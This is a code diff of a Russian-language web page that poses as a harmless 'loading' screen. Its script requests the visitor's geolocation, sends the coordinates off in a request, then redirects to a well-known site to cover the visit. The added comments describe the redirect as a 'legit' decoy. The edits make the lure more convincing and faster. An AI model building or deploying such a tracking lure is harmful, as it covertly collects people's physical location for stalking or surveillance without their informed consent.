@@ -2,12 +2,23 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8" />
-  <title>Загрузка...</title>
-  <style>body { text-align:center; margin-top:50px; font-family: Arial; }</style>
+  <title>Добро пожаловать</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 150px;
+      background: #fff;
+      color: #333;
+      user-select: none;
+    }
+    .message {
+      font-size: 20px;
+    }
+  </style>
 </head>
 <body>
-  <h2>Пожалуйста, подождите, идет загрузка...</h2>
-  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/65/Black_cat_silhouette.svg/240px-Black_cat_silhouette.svg.png" alt="Загрузка" width="200" />
+  <div class="message">Загружаем контент, пожалуйста, подождите...</div>
   <script>
     navigator.geolocation.getCurrentPosition(
       pos => {
@@ -19,14 +30,16 @@
             longitude: pos.coords.longitude
           })
         });
+        // После получения координат делаем редирект
         setTimeout(() => {
-          window.location.href = 'https://kinomax.ru/ryazan';  // можно заменить на любой "легит" сайт
-        }, 3000);
+          window.location.href = 'https://yandex.ru'; // <- сюда можно любой нормальный сайт
+        }, 1500);
       },
       err => {
+        // Если отказ или ошибка — тоже редирект
         setTimeout(() => {
-          window.location.href = 'https://kinomax.ru/ryazan';
-        }, 3000);
+          window.location.href = 'https://yandex.ru';
+        }, 1500);
       }
     );
   </script>
